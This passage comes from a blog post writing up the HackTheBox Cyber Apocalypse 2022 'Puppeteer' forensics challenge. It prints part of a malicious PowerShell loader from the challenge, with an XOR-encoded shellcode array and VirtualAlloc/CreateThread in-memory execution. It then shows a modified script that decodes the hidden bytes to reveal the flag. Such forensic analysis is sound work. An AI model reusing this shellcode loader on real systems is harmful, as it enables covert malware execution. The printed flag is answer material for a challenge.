class="nx">0x18</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x21</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x0b</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x28</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0x08</span><span class="p">,</span><span class="nx">0x19</span><span class="p">,</span><span class="nx">0x8e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x29</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xac</span><span class="p">,</span><span class="nx">0xf9</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x86</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0xb9</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xda</span><span class="p">,</span><span class="nx">0xfe</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0xe1</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x86</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0xbf</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xb0</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x1f</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0xed</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x12</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xf8</span><span class="p">,</span><span class="nx">0x17</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x27</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x65</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x36</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x16</span><span class="p">,</span><span class="nx">0x13</span><span class="p">,</span><span class="nx">0x21</span><span class="p">,</span><span class="nx">0x64</span><span class="p">,</span><span class="nx">0x73</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">;</span><span class="w">

</span><span class="p">[</span><span class="n">array</span><span class="p">]::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$stage2</span><span class="p">);</span><span class="w">

</span><span class="nv">$hRffYLENA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$tNZvQCljVk</span><span class="p">::</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,[</span><span class="n">Math</span><span class="p">]::</span><span class="n">Max</span><span class="p">(</span><span class="nv">$HVOASfFuNSxRXR</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="mi">0</span><span class="n">x1000</span><span class="p">),</span><span class="nx">0x3000</span><span class="p">,</span><span class="nx">0x40</span><span class="p">);</span><span class="w">

</span><span class="nv">$stage3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stage1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$stage2</span><span class="p">;</span><span class="w">

</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$HVOASfFuNSxRXR</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$hRffYLENA</span><span class="p">,</span><span class="nv">$HVOASfFuNSxRXR</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">


</span><span class="c"># Unpack Shellcode;</span><span class="w">

</span><span class="kr">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$HVOASfFuNSxRXR</span><span class="o">.</span><span class="nf">count</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nv">$HVOASfFuNSxRXR</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$HVOASfFuNSxRXR</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="mi">0</span><span class="n">xd1</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c">#Unpack Special Orders!</span><span class="w">

</span><span class="kr">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$stage3</span><span class="o">.</span><span class="nf">count</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="w">
    </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="mi">0</span><span class="n">xd1</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="nv">$tNZvQCljVk</span><span class="p">::</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$hRffYLENA</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w">
</span></pre></table></code></div></div><p>Looking at the end of the script, we can see how the <code class="language-plaintext highlighter-rouge">special orders</code> are unpacked. The <code class="language-plaintext highlighter-rouge">$stage3</code> string (result of <code class="language-plaintext highlighter-rouge">$stage1</code> + <code class="language-plaintext highlighter-rouge">$stage2</code>) is being XORed with <code class="language-plaintext highlighter-rouge">-bxor</code> using the key <code class="language-plaintext highlighter-rouge">0xd1</code>.</p><p>Let’s make some changes to the script to get the <code class="language-plaintext highlighter-rouge">$stage3</code> output after the XOR operation.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$stage1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x99</span><span class="p">,</span><span class="w"> </span><span class="nx">0x85</span><span class="p">,</span><span class="w"> </span><span class="nx">0x93</span><span class="p">,</span><span class="w"> </span><span class="nx">0xaa</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa6</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">;</span><span class="w">

</span><span class="nv">$stage2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">xac</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe0</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xbb</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">array</span><span class="p">]::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$stage2</span><span class="p">);</span><span class="w">

</span><span class="nv">$stage3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stage1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$stage2</span><span class="p">;</span><span class="w">

</span><span class="kr">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$stage3</span><span class="o">.</span><span class="nf">count</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="w">
    </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="mi">0</span><span class="n">xd1</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">echo</span><span class="w"> </span><span class="nv">$stage3</span><span class="p">;</span><span class="w">
</span></pre></table></code></div></div><p>Now let’s execute the modified script, piping the output with <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-hex?view=powershell-7.2." title="Format-Hex">Format-Hex</a></p><p><a href="/assets/img/posts/ctf-writeups/htbca2022/puppeteer/puppeteer2.png" class="popup img-link "><img data-src="/assets/img/posts/ctf-writeups/htbca2022/puppeteer/puppeteer2.png" alt="puppeteer2" class="lazyload" data-proofer-ignore></a> <em>Output of the modified script to get the flag</em></p><p>And we get the flag <strong><code class="language-plaintext highlighter-rouge">HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3...}</code></strong></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href='/categories/ctf-writeups/'>CTF writeups</a>, <a href='/categories/hackthebox-cyber-apocalypse-ctf-2022/'>HackTheBox Cyber Apocalypse CTF 2022</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/ctf-writeups/" class="post-tag no-text-decoration" >ctf-writeups</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >HackTheBox</a> <a href="/tags/htbca2022/" class="post-tag no-text-decoration" >HTBca2022</a> <a href="/tags/windows-forensics/" class="post-tag no-text-decoration" >windows-forensics</a> <a href="/tags/forensics/" class="post-tag no-text-decoration" >forensics</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted me-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB%20Cyber%20Apocalypse%20CTF%202022%20-%20Forensics%20-%20Puppeteer%20writeup%20-%20ruifi47&url=%2Fposts%2Fhtbca2022_puppeteer%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter" > <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20Cyber%20Apocalypse%20CTF%202022%20-%20Forensics%20-%20Puppeteer%20writeup%20-%20ruifi47&u=%2Fposts%2Fhtbca2022_puppeteer%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook" > <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fhtbca2022_puppeteer%2F&text=HTB%20Cyber%20Apocalypse%20CTF%202022%20-%20Forensics%20-%20Puppeteer%20writeup%20-%20ruifi47" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram" > <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/htbca2022_puppeteer/">HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup</a><li class="text-truncate lh-lg"> <a href="/posts/kalmarctf2023_tinyshell/">Decrypting Cobalt Strike traffic - Kalmar CTF 2023 lleHSyniT! writeup</a><li class="text-truncate lh-lg"> <a href="/posts/htbca2022_reversing/">HTB Cyber Apocalypse CTF 2022 - Reversing - WIDE, Rebuilding, Without a Trace & Teleport writeups</a><li class="text-truncate lh-lg"> <a href="/posts/typhoonconctf2022_hidden_character/">TyphoonCon CTF 2022 - Web - Hidden Character writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf-writeups/">ctf-writeups</a> <a class="post-tag btn btn-outline-primary" href="/tags/forensics/">forensics</a> <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag btn btn-outline-primary" href="/tags/htbca2022/">HTBca2022</a> <a class="post-tag btn btn-outline-primary" href="/tags/backdoor/">backdoor</a> <a class="post-tag btn btn-outline-primary" href="/tags/javascript/">javascript</a> <a class="post-tag btn btn-outline-primary" href="/tags/kalmarctf2023/">kalmarCTF2023</a> <a class="post-tag btn btn-outline-primary" href="/tags/reverse-engineering/">reverse-engineering</a> <a class="post-tag btn btn-outline-primary" href="/tags/sqli/">sqli</a> <a class="post-tag btn btn-outline-primary" href="/tags/typhoonconctf2022/">TyphoonConCTF2022</a></div></div></div><div id="toc-wrapper" class="ps-0 pe-4 mb-5"><div class="panel-heading ps-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-3 pe-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ms-1" data-toc-skip> Further Reading</h3><div class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><div class="col"> <a href="/posts/htbca2022_reversing/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1653238800" data-df="ll" > May 22, 2022 </em><h4 class="pt-0 my-2" data-toc-skip>HTB Cyber Apocalypse CTF 2022 - Reversing - WIDE, Rebuilding, Without a Trace & Teleport writeups</h4><div class="text-muted small"><p> WIDE Challenge Info We’ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You’ve managed to smuggle a discarded access terminal to the Widely In...</p></div></div></a></div><div class="col"> <a href="/posts/kalmarctf2023_tinyshell/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1678212000" data-df="ll" > Mar 7, 2023 </em><h4 class="pt-0 my-2" data-toc-skip>Decrypting Cobalt Strike traffic - Kalmar CTF 2023 lleHSyniT! writeup</h4><div class="text-muted small"><p> Introduction This writeup presents the intended solution for lleHSniT!, one of the forensics challenges of Kalmar CTF 2023. Description One of our users here at StupidCorp ran a malicious binar...</p></div></div></a></div><div class="col"> <a href="/posts/typhoonconctf2022_hidden_character/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1656176400" data-df="ll" > Jun 25, 2022 </em><h4 class="pt-0 my-2" data-toc-skip>TyphoonCon CTF 2022 - Web - Hidden Character writeup</h4><div class="text-muted small"><p> Hidden Character Challenge Description It takes one character [ ] to show you the path to salvation. And it takes a hidden character to lead you to the flag Let’s start by accessing the webs...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older" ><p>-</p></div><a href="/posts/htbca2022_reversing/" class="btn btn-outline-primary" prompt="Newer" ><p>HTB Cyber Apocalypse CTF 2022 - Reversing - WIDE, Rebuilding, Without a Trace & Teleport writeups</p></a></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf-writeups/">ctf-writeups</a> <a class="post-tag btn btn-outline-primary" href="/tags/forensics/">forensics</a> <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag btn btn-outline-primary" href="/tags/htbca2022/">HTBca2022</a> <a class="post-tag btn btn-outline-primary" href="/tags/backdoor/">backdoor</a> <a class="post-tag btn btn-outline-primary" href="/tags/javascript/">javascript</a> <a class="post-tag btn btn-outline-primary" href="/tags/kalmarctf2023/">kalmarCTF2023</a> <a class="post-tag btn btn-outline-primary" href="/tags/reverse-engineering/">reverse-engineering</a> <a class="post-tag btn btn-outline-primary" href="/tags/sqli/">sqli</a> <a class="post-tag btn btn-outline-primary" href="/tags/typhoonconctf2022/">TyphoonConCTF2022</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><footer><div class="container px-lg-4"><div class="d-flex justify-content-center align-items-center text-muted mx-md-3"><p>Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p><p>© 2023 <a href="https://github.com/ruifi47">ruifi47</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div></div></footer><div id="mask"></div><button id="back-to-top" aria-label="back-to-top" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.7/dayjs.min.js,npm/dayjs@1.11.7/locale/en.min.js,npm/dayjs@1.11.7/plugin/relativeTime.min.js,npm/dayjs@1.11.7/plugin/localizedFormat.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
